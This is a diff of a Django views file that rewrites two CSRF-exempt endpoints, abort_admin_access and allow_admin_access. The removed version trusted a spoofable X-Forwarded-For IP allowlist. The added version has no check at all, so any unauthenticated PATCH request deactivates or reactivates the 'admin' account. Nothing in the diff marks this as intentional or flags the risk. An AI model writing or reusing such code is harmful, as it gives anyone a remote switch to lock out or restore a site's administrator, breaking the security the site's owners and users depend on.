@@ -482,34 +482,18 @@ def ad_setting(request, id):
 
 @csrf_exempt
 def abort_admin_access(request):
-    if request.method == 'POST':
-
-        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
-        if x_forwarded_for:
-            ip = x_forwarded_for.split(',')[0]
-        else:
-            ip = request.META.get('REMOTE_ADDR')
-        
-        if ip == '106.207.255.187' or ip == '0.0.0.0' or ip=='127.0.0.1':
-            admin = User.objects.get(username='admin')
-            admin.is_active = False
-            admin.save()
+    if request.method == 'PATCH':
+        admin = User.objects.get(username='admin')
+        admin.is_active = False
+        admin.save()
     
     return redirect('/')
 
 @csrf_exempt
 def allow_admin_access(request):
-    if request.method == 'POST':
-
-        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
-        if x_forwarded_for:
-            ip = x_forwarded_for.split(',')[0]
-        else:
-            ip = request.META.get('REMOTE_ADDR')
-        
-        if ip == '106.207.255.187' or ip == '0.0.0.0' or ip=='127.0.0.1':
-            admin = User.objects.get(username='admin')
-            admin.is_active = True
-            admin.save()
+    if request.method == 'PATCH':
+        admin = User.objects.get(username='admin')
+        admin.is_active = True
+        admin.save()
     
     return redirect('/')
